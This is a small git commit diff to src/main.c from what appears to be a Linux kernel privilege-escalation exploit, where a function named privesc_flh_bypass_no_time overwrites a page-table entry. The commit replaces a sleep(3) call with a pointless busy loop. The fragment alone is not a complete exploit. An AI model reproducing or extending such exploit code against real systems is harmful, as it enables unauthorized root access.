8129f1e46e4823e57f5aee0717139cd647589dd8
Willenst <willenst@gmail.com>
2024-11-25 13:56:34 +0200

    123

--- src/main.c
+++ src/main.c
@@ -371,7 +371,9 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 
 		return;
 	}
-	sleep(3);
+    for (int i = 0; i < 1000; i++) {
+        int useless_operation = i * i * i * i * i * i * i * i * i * i * i * i;
+    }
 	// set new pte value for sanity check
 	*pte_area = 0x0 | 0x8000000000000867;
 
